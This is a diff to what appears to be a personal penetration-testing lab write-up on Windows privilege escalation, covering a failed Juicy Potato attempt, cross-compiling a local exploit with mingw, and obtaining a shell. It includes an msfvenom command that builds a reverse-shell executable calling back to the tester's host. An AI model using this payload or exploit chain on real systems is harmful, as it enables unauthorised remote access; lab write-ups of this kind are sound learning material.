@@ -111,15 +111,38 @@ so i try juicy potato and start by uploading the executable and a shell.exe that
 msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.45.228 -f exe -o shell.exe
 ```
 
+after being very anoyed i tried another path, i looked at the os version:
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+and found something that seemed to suit the situation:
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+I had problems compiling the exploit:
+
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+* The default `gcc` compiler on Linux does **not** include Windows headers by default.
+* The missing file suggests that i'm trying to compile a Windows-based program on a Linux system without the necessary Windows libraries.
+
+So i need to :\
 
 
+* **Windows-compatible toolchain** like `i686-w64-mingw32-gcc`, which includes Windows headers.
+* Alternatively, install Windows headers for Linux (`mingw-w64`)
 
+And manage to compile the exploit:
+
+```
+i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
+```
+
+and i just run the exploit and manage to get my shell:
+
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 #### 5. Cleanup
 
 * Removal of artifacts from the target
 * Documentation of vulnerabilities and exploitation methods
-
-### Detected Services
-
-_To add details about specific services, use the Exploitation Templates page._
